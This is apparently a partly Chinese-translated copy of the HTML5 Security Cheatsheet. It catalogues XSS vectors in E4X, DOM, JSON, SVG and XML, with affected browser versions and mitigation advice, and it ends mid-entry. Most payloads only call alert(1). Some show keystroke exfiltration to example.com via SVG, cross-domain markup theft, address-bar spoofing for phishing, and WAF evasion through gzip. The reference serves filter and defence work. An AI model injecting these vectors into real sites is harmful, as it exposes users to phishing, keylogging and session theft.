The history.pushState() and history.replaceState() API allows to create and modify the user's history. An attacker can use this feature to change the information displayed in the address bar as well as the location DOM object and thus initiate phishing attacks or obfuscate bad intentions. While pushState adds a new history entry, replaceState modifies the current one. This removes nearly all traces of the actual location from the browsing history giving no possibility to navigate back. The information shown in the address bar cannot be trusted anymore as soon as an attacker or a malicious website execute JavaScript.

```
<script>history.pushState(0,0,'/i/am/somewhere_else');</script> 
```

*   firefox 4.0
*   firefox latest

*   chrome 6.0

*   chrome latest

*   safari 5.0

*   safari latest

*   opera 11.50

*   opera latest

*   internet explorer 10.0

*   internet explorer latest

*   xss

*   javascript
*   spoofing
*   history
*   phishing

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/history.html`](http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html)

reporter：.mario, freddyb

### Executing JavaScript using ES6 Template Strings#140test

ES6 specifies a new language feature called "Template Strings" (often also referred to as "Quasi Literals" alongside multi-line strings and others). This allows to execute arbitrary JavaScript code without using parenthesis but back-ticks instead. Inside back-tick delimited strings, placeholders such as ${} can wrap executable code.

```
<script> 
alert`1`; 
var something = `abc${alert(1)}def`; 
``.constructor.constructor`alert\`1\``; 
</script> 
```

Make sure that your IDS, filter and other protective systems are aware of the fact, that back-ticks (U+0060) are now capable of initiating execution of methods and functions in JavaScript. Further make sure, that symbols such as ${} cannot be injected into existing template and multi-line strings.

*   firefox 34.0
*   firefox latest

*   es6

*   javascript
*   backtick
*   template

*   [`tc39wiki.calculist.org/es6/template-strings/`](http://tc39wiki.calculist.org/es6/template-strings/)

*   [`html5sec.org/es6/template`](https://html5sec.org/es6/template)
*   [`wiki.ecmascript.org/doku.php?id=harmony:quasis`](http://wiki.ecmascript.org/doku.php?id=harmony:quasis)

reporter：.mario

## E4X 向量

### Self-including E4X-based JavaScript snippet#25test

This <SCRIPT> tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.

```
<script src="#">{alert(1)}</script>;1 
```

E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)

*   firefox 1.5
*   firefox 16.0

*   xss

*   javascript
*   firefox
*   e4x
*   self-inclusion
*   proprietary

*   [`developer.mozilla.org/en/E4X`](https://developer.mozilla.org/en/E4X)

reporter：.mario

### E4X-based UTF-7 JavaScript/HTML snippet stealing cross-domain markup#26test

In case an attacker can inject the character sequence beginning with .toXMLString() it's possible to include the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain and protocol borders. Note that the whole vector is encoded in UTF-7\. This is possible since the including <SCRIPT> tag can decide via charset attribute what charset to use.

```
+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input); 
```

Make sure all sites are being applied with a defined charset like UTF-8\. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.

*   firefox 1.5
*   firefox 4.0.1

*   xss

*   javascript
*   firefox
*   e4x
*   stealing
*   utf7
*   proprietary

*   [`developer.mozilla.org/en/E4X`](https://developer.mozilla.org/en/E4X)

reporter：.mario

### E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time#58test

This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).

```
<b><script<b></b><alert(1)</script </b></b> 
```

*   firefox 1.5
*   firefox 3.6.28

*   xss

*   javascript
*   e4x
*   script
*   parser
*   regex

*   [`developer.mozilla.org/en/E4X`](https://developer.mozilla.org/en/E4X)

*   [`bugzilla.mozilla.org/show_bug.cgi?id=564706`](https://bugzilla.mozilla.org/show_bug.cgi?id=564706)

reporter：.mario

### E4X used to close an opening <SCRIPT> tag and {} evaluation#75test

In this example an E4X object is being used to close a half-open <SCRIPT> tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters. This technique will not work anymore as soon Firefox uses the already integrated HTML5 parser (html5.enable=true)

```
<script<{alert(1)}/></script </> 
```

*   firefox 1.5
*   firefox 3.6.28

*   xss

*   javascript
*   e4x
*   script
*   parser
*   regex

*   [`developer.mozilla.org/en/E4X`](https://developer.mozilla.org/en/E4X)

*   [`bugzilla.mozilla.org/show_bug.cgi?id=564706`](https://bugzilla.mozilla.org/show_bug.cgi?id=564706)

reporter：.mario, Gareth

## DOM 属性与方法的攻击向量

### 通过 DOM Worker 包含上下文本身进行 XSS#4test

这是一个 self-including 的例子,通过 DOM worker 包含上下文的方式触发事件引起脚本执行.

```
0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk')) 
```

*   firefox 3.5
*   firefox 15.0

*   xss

*   dom
*   firefox
*   worker
*   self-inclusion
*   e4x

*   [`developer.mozilla.org/En/Using_web_workers`](https://developer.mozilla.org/En/Using_web_workers)

reporter：.mario

### Firefox crypto 对象 - 隐式 eval()#5test

这个向量披露了火狐中 crypto 对象的一个隐式 eval()

```
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script> 
```

*   firefox 2.x
*   firefox 34.0

*   xss

*   dom
*   firefox
*   crypto
*   eval
*   csp
*   proprietary

*   [`developer.mozilla.org/en/JavaScript_crypto`](https://developer.mozilla.org/en/JavaScript_crypto)

reporter：.mario

## 基于 JSON 的向量

### Self-hijacking JSON literals#54test

In case parts of a JSON literal are controlled by user input there's a risk to allow auto-harvesting values from later object members.

```
<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script> 
```

*   opera 10.0
*   opera 10.10

*   chrome 4.0

*   chrome 6.0

*   firefox 1.x

*   firefox 3.0.19

*   xss

*   javascript
*   json
*   **definesetter**
*   object
*   prototype

reporter：.mario

## SVG 内的向量

### 通过 SVG 中 G 标签的 onload 属性执行 Javascript#11test

SVG 文件中可以通过任意元素的 onload 事件执行 Javascript,且不需要用户交互

```
<svg ><g onload="javascript:alert(1)"></g></svg> 
```

在上传时不能把 SVG 当图片处理,因为它可以包含任意 HTML,且能被浏览器解析

*   opera 10.0
*   opera 12.0

*   chrome 4.0

*   chrome 35.0

*   firefox 3.0

*   firefox 3.6.28

*   safari 5.0

*   safari 5.1.7

*   internet explorer 9.0

*   internet explorer latest

*   xss

*   svg
*   onload
*   opera
*   firefox
*   chrome
*   internet explorer

*   [`developer.mozilla.org/en/SVG`](https://developer.mozilla.org/en/SVG)

reporter：.mario

### Opera 10 SVG font XSS#43test

Opera 10.00 and later minor versions allow using SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.

```
<?xml version="1.0" standalone="no"?> <html > <head> <style type="text/css"> @font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";} </style> </head> <body>Hello</body> </html>``<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" ><defs><font id="x"><font-face font-family="y"/></font></defs></svg>required_mime: image/svg+xmlcrossdomain: 0path: [`html5sec.org/font.svg`](http://html5sec.org/font.svg)name: font.svg 
```

*   opera 10.0

*   xss

*   javascript
*   opera
*   svg
*   font
*   svgfont

reporter：.mario

### SVG file executing JavaScript via <SCRIPT> tag#47test

SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction

```
<svg ><script>alert(1)</script></svg> 
```

SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements

*   opera 10.x
*   opera latest

*   chrome 4.0

*   chrome latest

*   firefox 3.x

*   firefox latest

*   internet explorer 9.0

*   internet explorer latest

*   safari 5.0

*   safari latest

*   xss

*   svg
*   script
*   opera
*   firefox
*   chrome
*   internet explorer

reporter：Romain

### SVG element allows automatic execution of onload attribute without other SVG elements.#65test

SVG tags allow code to be executed with onload without any other elements. This makes for a very short and effective XSS vector, useful in many situations.

```
<svg onload="javascript:alert(1)" ></svg> 
```

Not really a bug to fix, this is desired behaviour and only increases XSS scope.

*   chrome 4.0
*   chrome latest

*   safari 3.4

*   safari latest

*   firefox 2.0

*   firefox latest

*   opera 9.x

*   opera latest

*   internet explorer 9.0

*   internet explorer latest

*   xss

*   svg
*   onload
*   chrome
*   firefox
*   safari
*   opera

*   [`www.w3.org/TR/SVG11/attindex.html`](http://www.w3.org/TR/SVG11/attindex.html)

*   [`www.w3.org/TR/SVGTiny12/attributeTable.html`](http://www.w3.org/TR/SVGTiny12/attributeTable.html)

reporter：gareth

### SVG simple passive JavaScript execution via XLink#87test

Browsers that support SVG, forced to support XLink. The parameter of the attribute "xlink:actuate" for <a> tag is fixed - "onRequest".

```
<svg > <a  xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a> </svg> 
```

*   chrome 4.0
*   chrome latest

*   safari 3.4

*   safari latest

*   firefox 3.0

*   firefox latest

*   opera 9.x

*   opera latest

*   internet explorer 6.0

*   internet explorer latest

*   xss

*   svg
*   passive
*   xlink
*   chrome
*   firefox
*   safari
*   opera

*   [`www.w3.org/TR/SVG11/linking.html`](http://www.w3.org/TR/SVG11/linking.html)

*   [`www.w3.org/TR/SVGTiny12/linking.html`](http://www.w3.org/TR/SVGTiny12/linking.html)
*   #68
*   #81
*   #130

reporter：LeverOne

### SVG active JavaScript execution via XLink in Opera#88test

The content of the xml-links will be automatically included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-elements.

```
<svg  > <animation xlink:href="javascript:alert(1)"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:alert(1)"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/> </svg> 
```

*   opera 9.x
*   opera 12.0

*   xss

*   svg
*   active
*   xlink
*   opera

*   [`www.w3.org/TR/SVG11/attindex.html`](http://www.w3.org/TR/SVG11/attindex.html)

*   [`www.w3.org/TR/SVGTiny12/attributeTable.html`](http://www.w3.org/TR/SVGTiny12/attributeTable.html)
*   #95
*   #129

reporter：LeverOne

### SVG event handler injection via "set" and "animate"#89test

Google Chrome and Safari support binding an event handler using the elements <set> or <animate>. The attribute value is the actually bound event while the "to" attribute value holds the payload. The problem has been fixed in recent Chrome versions.

```
<svg > <set attributeName="onmouseover" to="alert(1)"/> <animate attributeName="onunload" to="alert(1)"/> </svg> 
```

*   chrome 4.0
*   chrome 10.0

*   safari 3.4

*   safari 4.0.3

*   xss

*   svg
*   event
*   safari
*   chrome

*   [`www.w3.org/TR/SVG11/animate.html`](http://www.w3.org/TR/SVG11/animate.html)

*   [`www.w3.org/TR/SVGMobile12/animate.html`](http://www.w3.org/TR/SVGMobile12/animate.html)
*   #24
*   #28

reporter：LeverOne

### Using SVG element <handler>#94test

Specification SVG Tiny 1.2 provides an element <handler>, which is a "bridge" between SVG and XML-events. This element can contain regular JavaScript.

```
<svg > <handler  ev:event="load">alert(1)</handler> </svg> 
```

*   opera 10.0
*   opera 12.0

*   xss

*   svg
*   opera
*   XML-events

*   [`www.w3.org/TR/SVGMobile12/script.html#HandlerElement`](http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement)

*   [`www.w3.org/TR/xml-events/`](http://www.w3.org/TR/xml-events/)
*   #85
*   #104
*   #127

reporter：LeverOne

### Using SVG element <feImage> and animated data URIs#95test

SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it's possible to execute JavaScript without user interaction. List all of the elements which can be animated can be found in the specified documentation.

```
<svg  > <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg> 
```

Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.

*   opera 10.0
*   opera 12.0

*   xss

*   svg
*   opera
*   filter effects
*   feimage

*   [`www.w3.org/TR/SVG/filters.html`](http://www.w3.org/TR/SVG/filters.html)

*   [`www.w3.org/TR/SVG11/animate.html#Animatable`](http://www.w3.org/TR/SVG11/animate.html#Animatable)
*   [`www.w3.org/TR/SVGMobile12/animate.html#Animatable`](http://www.w3.org/TR/SVGMobile12/animate.html#Animatable)
*   #88

reporter：.mario

### Executing JavaScript in SVG Tiny 1.2 without user interaction#104test

Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via arbitrary tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler. It is also possible to refer to an element contained in the SVG by its ID or an external resource.

```
<svg  id="foo"> <x  event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg…Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/> </svg> 
```

*   opera 10.x
*   opera 12.0

*   xss

*   javascript
*   svg
*   tinysvg
*   listener
*   xml
*   events

*   [`www.w3.org/TR/SVGMobile12/script.html`](http://www.w3.org/TR/SVGMobile12/script.html)

*   [`www.w3.org/TR/2003/REC-xml-events-20031014/`](http://www.w3.org/TR/2003/REC-xml-events-20031014/)
*   #85
*   #94
*   #127

reporter：.mario

### SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml#105test

Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example. Notice that the compressed data can be truncated. Opera will still accept it and render the <script> tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish). The example contains no actual SVG code - just a regular <script> tag with a XHTML namespace attribute.

```
<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9…D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe> 
```

*   opera 10.x
*   opera 12.0

*   xss

*   javascript
*   svg
*   svgz
*   gzip
*   xml
*   compression

*   [`www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html`](http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html)

reporter：.mario

### Passive SVG JavaScript execution via style injection (1) #109test

SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.

```
<svg > <a id="x"><rect fill="white" width="1000" height="1000"/></a> <rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/> </svg>``<svg  > <clipPath id="a" > <set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" /> </clipPath> <pattern id="b"> <set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" /> </pattern> <filter id="c"> <set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" /> </filter> <marker id="d"> <set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(1)" /> </marker> <mask id="e"> <set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(2)" /> </mask> <linearGradient id="f"> <set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(3)" /> </linearGradient> </svg>required_mime: image/svg+xmlcrossdomain: 1path: [`html5sec.org/test3.svg`](http://html5sec.org/test3.svg)name: test3.svg 
```

*   opera 10.x
*   opera 12.0

*   xss

*   javascript
*   svg
*   css
*   xml
*   style

*   #129

reporter：LeverOne

### Passive SVG JavaScript execution via style injection (2)#110test

This example shows how SVG markers allow insertion of external links with JavaScript URI into the current document.

```
<svg > <path d="M0,0" style="marker-start:url(test4.svg#a)"/> </svg>``<svg  > <marker id="a" markerWidth="1000" markerHeight="1000" refX="0" refY="0"> <a xlink:href="http://google.com"> <set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" /> <rect width="1000" height="1000" fill="white"/> </a> </marker> </svg>required_mime: image/svg+xmlcrossdomain: 1path: [`html5sec.org/test4.svg`](http://html5sec.org/test4.svg)name: test4.svg 
```

*   opera 10.x
*   opera 11.52

*   xss

*   javascript
*   svg
*   css
*   xml
*   style

reporter：LeverOne

### SVG chameleon behavior via embedded XSLT#125test

This SVG chameleon file can be embedded via <embed> on most, and via <img> on most modern browsers. Thanks to the embedded XSLT stylesheet, it will change it's appearance, depending on how it is embedded or displayed. In an <img> tag it just shows a red dot. But opened directly or via an <iframe> or <embed>, the XSLT turns all SVG into (X)HTML and an alert will show. While most modern browsers show this behavior, Opera will completely mess it up, and show an alert when used via <embed> and an <iframe> when used via <img> (!). Chrome will show a broken image and an alert.

```
<?xml version="1.0"?> <?xml-stylesheet type="text/xml" href="#stylesheet"?> <!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]> <svg > <xsl:stylesheet id="stylesheet" version="1.0" > <xsl:template match="/"> <iframe  src="javascript:alert(1)"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle> </svg> 
```

*   internet explorer 9.0
*   internet explorer latest

*   firefox 3.x

*   firefox latest

*   svg

*   html
*   chameleon
*   xslt
*   embedded
*   xss

*   [`www.w3.org/Graphics/SVG/`](http://www.w3.org/Graphics/SVG/)

*   [`www.w3.org/TR/xslt`](http://www.w3.org/TR/xslt)
*   [`www.dpawson.co.uk/xsl/sect2/onefile.html`](http://www.dpawson.co.uk/xsl/sect2/onefile.html)

reporter：.mario

### Opera 中通过 listener 执行 JavaScript 代码#127test

示例向量，与#94 相关，展示了 listener 标签和 handler 标签的组合是如何被利用，从 SVG 元素中加载事件去触发 JavaScript，使其执行。到目前为止，只有 Opera 支持 XML 事件和相关元素。不需要用户交互即可执行 JavaScript 语句。

```
<svg  id="x"> <listener event="load" handler="#y"  observer="x"/> <handler id="y">alert(1)</handler> </svg> 
```

*   opera 9.0
*   opera 12.0

*   svg

*   opera
*   xml
*   events
*   listener
*   handler
*   xss

*   [`www.opera.com/docs/specs/presto29/svg/elements/`](http://www.opera.com/docs/specs/presto29/svg/elements/)

*   [`www.w3.org/TR/SVGMobile12/script.html#ListenerElement`](http://www.w3.org/TR/SVGMobile12/script.html#ListenerElement)
*   [`www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers`](http://www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers)
*   #85
*   #94
*   #104

reporter：.mario

### Firefox 解析 SVG 中被编码的 HTML 实体#128test

Firefox 4 允许 HTML 实体被用在纯文本标签中去表示他们原有的含义，例如 style，nostyle，noframes 和其他标签。尽管 HTML 已经被编码，但是这一特性仍有可能导致绕过过滤，特别是在内联 SVG 和 innerHTML 的拷贝被使用时。这一 bug 已在最新的 Firefox 中修复。

```
<svg><style>&lt;img/src=x onerror=alert(1)// </b> 
```

*   firefox 4.0

*   svg

*   xss
*   inline
*   entities
*   firefox
*   css
*   xml
*   innerhtml

*   [`www.mozilla.org/security/announce/2011/mfsa2011-27.html`](http://www.mozilla.org/security/announce/2011/mfsa2011-27.html)

*   [`developer.mozilla.org/en/svg_in_html_introduction`](https://developer.mozilla.org/en/svg_in_html_introduction)
*   #59
*   #97
*   #98

reporter：.mario

### Opera active JavaScript execution via STYLE in SVG#129test

Additional to script execution via "xlink:href" in SVG elements such as <image>, <animation>, <foreignObject>, Opera 11 allows to utilize filters (as well as other CSS properties listed in #109) to accomplish the same. Note that either these CSS properties, as well as the analogous attributes (the filter attribute in particular) can be used in this case. Both style and analogous attributes in inline SVG should be considered unsafe.

```
<svg> <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'> <!-- Same effect with <image filter='...'> --> </svg> 
```

Do not allow style and filter attributes inside user generated SVG data. It's considerably the best to generally avoid user generated SVG data - if possible.

*   opera 11.60
*   opera 12.0

*   svg

*   xss
*   inline
*   opera
*   css
*   style

*   #88

*   #109

reporter：LeverOne

### SVG <set> and <animate> elements allow key-logging w/o JavaScript#132test

It is possible to achieve an injection capable to exfiltrate keyboard events without any JavaScript execution via SVG and set/animate timing attributes. In essence, an access key can be specified to trigger events inside an SVG. In case an inline SVG is being used, the listener for these keys observes the whole document - and not just the SVG itself. This means that even keystrokes into a form input trigger the SVG access key handler. Once this access key handler is being combined with adding a new keystroke-depending image source to an existing image, the form input will be filled, and the SVG will reset a hidden image source according to the key being pressed and thereby silently exfiltrate the data. Since all this works without using any JavaScript, it was also possible to execute this attack in latest Thunderbird versions - with the vector invisibly wrapped inside the mail-body. The problem has been reported and fixed, CVE-2011-3663 has been assigned. Current stable versions of Firefox still allow to observe the problem - using a network traffic monitor/Firebug is recommended.

```
<!doctype html> <form> <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label> <br> <input name="secret" type="password"> </form> <!-- injection --><svg height="50px"> <image > <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /> <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /> <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /> <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /> </image> </svg> 
```

*   firefox 4
*   firefox latest

*   svg

*   html5
*   noscript
*   keylogger
*   firefox
*   thunderbird

*   [`www.mozilla.org/security/announce/2011/mfsa2011-56.html`](http://www.mozilla.org/security/announce/2011/mfsa2011-56.html)

*   [`bugzilla.mozilla.org/show_bug.cgi?id=704482`](https://bugzilla.mozilla.org/show_bug.cgi?id=704482)
*   [`www.w3.org/TR/SVG/animate.html#TimingAttributes`](http://www.w3.org/TR/SVG/animate.html#TimingAttributes)

reporter：.mario

### Executing JavaScript via "from" attribute in SVG and inline-SVG#137test

It is commonly known, that the <animate> element in combination with the "to" parameter can be used to change existing attributes to potentially active values and cause arbitrary script execution. It is nevertheless also possible to use the "from" attribute for the very same purpose - albeit this being rather counter-intuitive. The given example code snippet describes an SVG containing a circle that encapsulates an <animate> element. This uses the "from" attribute to set the "href" attribute of the link encapsulating the circle to a JavaScript URI. Clicking the circle will execute the JavaScript.

```
<svg> <a  xlink:href="?"> <circle r="400"></circle> <animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" /> </a> 
```

Avoid inline-SVG in combination with user-generated content. In case SVG needs to be used, avoid potentially harmful content for "to", "from", "values" and "by" attributes.

*   firefox 25.0
*   firefox latest

*   opera 15.0

*   opera latest

*   chrome 30.0

*   chrome latest

*   safari 5.0

*   safari latest

*   html5

*   svg
*   from
*   inline
*   xss
*   passive

*   [`jsbin.com/uxadon/3`](http://jsbin.com/uxadon/3)

*   [`www.w3.org/TR/SVG/animate.html#FromAttribute`](http://www.w3.org/TR/SVG/animate.html#FromAttribute)

reporter：.mario

### Executing JavaScript using ES6 Template Strings in SVG#141test

The new language features shown in #140 can also be used in the context of an SVG image. Here, the named entity of the back-tick, the ` can be used to initiate execution of a function or method.

```
<svg><script> alert&DiacriticalGrave;1&DiacriticalGrave; <p> <svg><script> alert&grave;1&grave; <p> 
```

Make sure that your IDS, filter and other protective systems are aware of the fact, that in SVG, HTML-encoded back-ticks (U+0060) are now capable of initiating execution of methods and functions in JavaScript.

*   firefox 34.0
*   firefox latest

*   es6

*   javascript
*   backtick
*   template
*   svg

*   [`tc39wiki.calculist.org/es6/template-strings/`](http://tc39wiki.calculist.org/es6/template-strings/)

*   [`html5sec.org/es6/template`](https://html5sec.org/es6/template)
*   [`wiki.ecmascript.org/doku.php?id=harmony:quasis`](http://wiki.ecmascript.org/doku.php?id=harmony:quasis)

reporter：.mario

## X(HT)ML 相关向量

### 通过 Opera XML-stylesheets 执行 JavaScript#17test

Opera 9.x 和 10.0 允许 XML-stylesheets 使用 Javascript URI.这个向量在 mime-type 是 text/html 的情况下是也有效的.

```
<?xml-stylesheet href="javascript:alert(1)"?><root/> 
```

确保用户输入的没有包含 XML stylesheets 或者只允许能被<\w+匹配的标签 - 因为这个向量需要<\?\w+才能匹配.黑名单是有可能被绕过的.

*   opera 9.x
*   opera 10.10

*   xss

*   javascript
*   opera
*   xml
*   css
*   proprietary

reporter：.mario

### <SCRIPT>和其它类似标签内的 Entities#18test

By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and rendered as X(HT)ML.

```
<script >&#x61;l&#x65;rt&#40;1)</script> 
```

确保过滤器或其它检测系统考虑了<script>或<style>和其它标签之间允许有 Entities 的事实.而不仅仅是属性.

*   opera 8.x
*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 5.0

*   safari latest

*   internet explorer 9.0

*   internet explorer latest

*   xss

*   javascript
*   opera
*   internet explorer
*   firefox
*   chrome
*   safari
*   xml
*   entity

reporter：.mario

### Arbitrary payload injection via XML External Entities (XXE)#64test

Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML. Note that the absolute URL for the source of XXE is required.

```
<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y> 
```

In case an attacker can inject data into the DOCTYPE area of the targeted website it's easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.

```
<script >alert(1)</script>crossdomain: 0path: [`html5sec.org/test.xxe`](http://html5sec.org/test.xxe)name: test.xxe 
```

*   chrome 3.0
*   chrome latest

*   opera 16.0

*   opera latest

*   safari 3.0

*   safari latest

*   xss

*   javascript
*   xxe
*   safari
*   chrome
*   xml
*   entities
*   doctype

*   [`xmlwriter.net/xml_guide/entity_declaration.shtml`](http://xmlwriter.net/xml_guide/entity_declaration.shtml)

*   [`www.w3.org/TR/REC-xml/`](http://www.w3.org/TR/REC-xml/)
*   #67
*   #76

reporter：.mario

### Opera XML-stylesheets executing JavaScript (2)#66test

Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "#xss"), when the stylesheet implemented in the current document.

```
<?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?> <root/> 
```

*   opera 8.0
*   opera 12.0

*   xss

*   javascript
*   opera
*   xslt
*   xsl
*   stylesheet
*   xml

reporter：LeverOne

### XML ATTLIST declaration causing JavaScript execution#67test

XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it's possible to create an ATTLIST declaration causing JavaScript execution without user interaction.

```
<!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)"> ]><img /> 
```

In case a website is being delivered as XML or XHTML make sure an attacker has no possibility to inject data into the DOCTYPE or create new ATTLIST directives.

*   chrome 4.0
*   chrome latest

*   safari 3.0

*   safari latest

*   firefox 3.0

*   firefox latest

*   opera 8.0

*   opera latest

*   xss

*   javascript
*   opera
*   attlist
*   doctype
*   chrome
*   firefox
*   safari

*   [`xmlwriter.net/xml_guide/attlist_declaration.shtml`](http://xmlwriter.net/xml_guide/attlist_declaration.shtml)

*   #64
*   #76

reporter：.mario

### Passive JavaScript execution via XLinks#68test

Gecko based browsers like Firefox allow using XLinks. Those can be equipped with a JavaScript URI to execute JavaScript in case the user clicks on one of those XLinks.

```
<doc  > <html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x> </doc> 
```

*   firefox 3.0
*   firefox 3.6.28

*   xss

*   javascript
*   xlink
*   firefox
*   xml

*   [`www.w3.org/TR/xlink/`](http://www.w3.org/TR/xlink/)

*   [`www.w3.org/TR/2010/REC-xlink11-20100506/`](http://www.w3.org/TR/2010/REC-xlink11-20100506/)
*   #81
*   #87

reporter：.mario

### Opera WML JavaScript execution via timer event#69test

Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it's a WML and renders it accordingly. With a timer event and a connected redirect it's possible to execute JavaScript without user interaction.

```
<card ><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card> 
